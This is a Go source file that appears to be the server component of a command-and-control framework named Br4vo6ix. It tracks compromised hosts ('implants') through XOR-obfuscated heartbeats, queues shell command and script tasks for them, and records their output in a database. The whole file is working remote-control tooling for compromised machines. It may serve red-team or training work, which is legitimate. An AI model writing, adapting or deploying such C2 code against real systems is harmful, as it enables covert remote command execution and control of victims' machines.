package main

import (
	"context"
	"fmt"
	"net"
	"time"

	"github.com/BradHacker/Br4vo6ix/ent"
	"github.com/BradHacker/Br4vo6ix/ent/implant"
	"github.com/BradHacker/Br4vo6ix/ent/task"
	"github.com/BradHacker/Br4vo6ix/pb"
	"github.com/google/uuid"
	"github.com/sirupsen/logrus"
	"google.golang.org/protobuf/proto"
)

func EncodeDecodeData(data []byte, key []byte) []byte {
	output := make([]byte, len(data))
	for i, inputByte := range data {
		output[i] = inputByte ^ key[i%len(key)]
	}
	return output
}

func ReadHeartbeat(c net.Conn, XOR_KEY []byte) (*pb.Heartbeat, error) {

	hbBuffer := make([]byte, 4096)
	hbNumBytes, err := c.Read(hbBuffer)
	if err != nil {
		return nil, fmt.Errorf("error reading from connection: %v", err)
	}
	if err != nil {
		return nil, fmt.Errorf("error trimming buffer: %v", err)
	}
	decHbBytes := EncodeDecodeData(hbBuffer[:hbNumBytes], []byte(XOR_KEY))
	hb := pb.Heartbeat{}
	err = proto.Unmarshal(decHbBytes, &hb)
	if err != nil {
		return nil, fmt.Errorf("error while unmarshalling: %v\n%v", err, hbBuffer)
	}
	return &hb, nil
}

func GetImplant(ctx context.Context, client *ent.Client, hb *pb.Heartbeat) (*ent.Implant, error) {
	imp, err := client.Implant.Query().Where(
		implant.And(
			implant.MachineIDEQ(hb.MachineId),
			implant.IPEQ(hb.Ip),
		),
	).Only(ctx)
	if ent.IsNotFound(err) {
		imp, err = client.Implant.Create().SetUUID(uuid.NewString()).SetHostname(hb.Hostname).SetIP(hb.Ip).SetMachineID(hb.MachineId).Save(ctx)
		if err != nil {
			return nil, fmt.Errorf("error while creating implant in db: %v", err)
		}
	} else if err != nil {
		return nil, fmt.Errorf("error while querying implant in db: %v", err)
	}
	return imp, nil
}

func LogCallback(ctx context.Context, client *ent.Client, entImplant *ent.Implant, hb *pb.Heartbeat) (*ent.Heartbeat, error) {
	// Set the last seen time of the implant
	err := entImplant.Update().SetLastSeenAt(time.Now()).Exec(ctx)
	if err != nil {
		logrus.Warnf("error updating last seen at: %v\n", err)
		// Keep going as this is non-critical
	}

	// Log this heartbeat
	entHeartbeat, err := client.Heartbeat.Create().
		SetUUID(uuid.NewString()).
		SetImplant(entImplant).
		SetHostname(hb.Hostname).
		SetPid(int(hb.Pid)).
		SetIP(hb.Ip).
		SetPort(int(hb.Port)).
		Save(ctx)
	if err != nil {
		return nil, fmt.Errorf("error creating heartbeat in db: %v", err)
	}
	return entHeartbeat, nil
}

func GetQueuedTask(ctx context.Context, entImplant *ent.Implant) (*ent.Task, error) {
	// Query the tasks that have not run from first created to last
	nextTask, err := entImplant.QueryTasks().
		Where(task.HasRunEQ(false)).
		Order(ent.Asc(task.FieldCreatedAt)).
		First(ctx)
	if !ent.IsNotFound(err) {
		return nil, fmt.Errorf("error querying tasks from implant: %v", err)
	}
	return nextTask, nil
}

func GenerateTask(entHeartbeat *ent.Heartbeat, entTask *ent.Task, XOR_KEY []byte) ([]byte, error) {
	// Map ent task type to protobuf task type
	var taskType pb.Task_TaskType
	switch entTask.Type {
	case task.TypeCMD:
		taskType = pb.Task_CMD
	case task.TypeSCRIPT:
		taskType = pb.Task_SCRIPT
	default:
		taskType = pb.Task_NOOP
	}
	queuedTask := pb.Task{
		Uuid:          entTask.UUID,
		HeartbeatUuid: entHeartbeat.UUID,
		Type:          taskType,
		Payload:       entTask.Payload,
	}

	taskBytes, err := proto.Marshal(&queuedTask)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal protobuf: %v", err)
	}
	encTaskBytes := EncodeDecodeData(taskBytes, XOR_KEY)
	return encTaskBytes, nil
}

func SendNoOp(c net.Conn, XOR_KEY []byte) error {
	t := pb.Task{
		Uuid:          "",
		HeartbeatUuid: "",
		Type:          pb.Task_NOOP,
		Payload:       "",
	}

	taskBytes, err := proto.Marshal(&t)
	if err != nil {
		return fmt.Errorf("error marshalling task: %v", err)
	}

	encNoopBytes := EncodeDecodeData(taskBytes, []byte(XOR_KEY))
	_, err = c.Write(encNoopBytes)
	if err != nil {
		return fmt.Errorf("error sending NOOP task: %v", err)
	}
	return nil
}

func SendTask(c net.Conn, entHeartbeat *ent.Heartbeat, entTask *ent.Task, XOR_KEY []byte) error {
	// Convert our ent objects into a protobuf to send to the implant
	queuedTaskBytes, err := GenerateTask(entHeartbeat, entTask, XOR_KEY)
	if err != nil {
		return fmt.Errorf("failed to generate queued task: %v", err)
	}

	// Send the protobuf to the implant
	numSentBytes, err := c.Write(queuedTaskBytes)
	if err != nil {
		return fmt.Errorf("error sending task to implant: %v", err)
	}
	if numSentBytes != len(queuedTaskBytes) {
		return fmt.Errorf("didn't send all bytes (sent %d of %d)", numSentBytes, len(queuedTaskBytes))
	}
	return nil
}

func ReadTaskResponse(ctx context.Context, c net.Conn, client *ent.Client, XOR_KEY []byte) error {
	// Read the data over the connection
	// TODO: handle data larger than 16000 bytes
	readResponseBuffer := make([]byte, 16000)
	numResBytes, err := c.Read(readResponseBuffer)
	if err != nil {
		return fmt.Errorf("error reading from connection: %v", err)
	}

	// Decode the response data
	decResBuffer := EncodeDecodeData(readResponseBuffer[:numResBytes], XOR_KEY)
	res := pb.TaskResponse{}
	err = proto.Unmarshal(decResBuffer, &res)
	if err != nil {
		return fmt.Errorf("error while unmarshalling: %v", err)
	}

	// Update the response in the database
	err = client.Task.Update().
		Where(task.UUIDEQ(res.Uuid)).
		SetHasRun(true).
		SetStdout(res.Stdout).
		SetStderr(res.Stderr).
		Exec(ctx)
	if err != nil {
		return fmt.Errorf("error updating task with response in db: %v", err)
	}
	return nil
}
